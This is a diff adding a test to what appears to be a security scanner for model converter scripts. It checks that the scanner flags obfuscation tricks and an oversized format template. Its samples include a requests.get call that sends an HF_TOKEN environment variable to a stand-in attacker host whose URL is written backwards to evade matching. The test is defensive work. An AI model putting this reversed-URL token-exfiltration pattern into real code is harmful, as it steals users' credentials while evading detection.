@@ -4238,6 +4238,64 @@ def test_a_destination_spelled_in_character_codes_refuses_it():
     ) == []
 
 
+def test_a_sliced_constant_and_an_oversized_template_are_read_or_refused():
+    """"c/tcelloc/elpmaxe.live//:sptth"[::-1] is a whole URL written backwards,
+    so nothing matched a scheme and the hub literal beside it granted the
+    allowance. Subscripting a NAME that carries a URL was already refused, and
+    a literal that becomes one only when it is sliced is the same reshape with
+    the text written out.
+
+    A template is checked by length before anything parses it: Formatter().parse
+    turns a megabyte of repeated {} into half a million tuples, out of a file
+    the scan accepts at up to 8 MiB, and no converter writes a 64 KiB format
+    string.
+    """
+    module = _load(
+        "converter_scan_slice_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    token = 'headers = {"x": os.environ["HF_TOKEN"]})\n'
+
+    assert [
+        f.check for f in scan_converter_source(
+            preamble
+            + 'requests.get("c/tcelloc/elpmaxe.live//:sptth"[::-1], ' + token
+        )
+    ]
+    # A bound this cannot read, over text that spells no URL until it is
+    # sliced: the fold cannot help here, and not reading it is not a reason to
+    # say nothing.
+    assert [
+        f.check for f in scan_converter_source(
+            preamble
+            + 'requests.get("c/tcelloc/elpmaxe.live//:sptth"[::step], ' + token
+        )
+    ]
+
+    # Slicing what came back from the hub is what upstream does, and it is not
+    # a literal at all.
+    assert scan_converter_source(
+        preamble + 'url = f"{HUB}/api"\nraw = data[:8]\n'
+        + 'requests.get(url, ' + token
+    ) == []
+
+    started = time.perf_counter()
+    assert [
+        f.check for f in scan_converter_source(
+            preamble + 'url = "' + "{}" * 262_000 + '".format(a)\n'
+            + 'requests.get(HUB, ' + token
+        )
+    ]
+    assert time.perf_counter() - started < 5
+    # A template of an ordinary size is still folded, which is what keeps the
+    # fifteen upstream .format() calls readable.
+    assert scan_converter_source(
+        preamble + 'url = "{}/api/models".format(HUB)\n'
+        + 'requests.get(url, ' + token
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
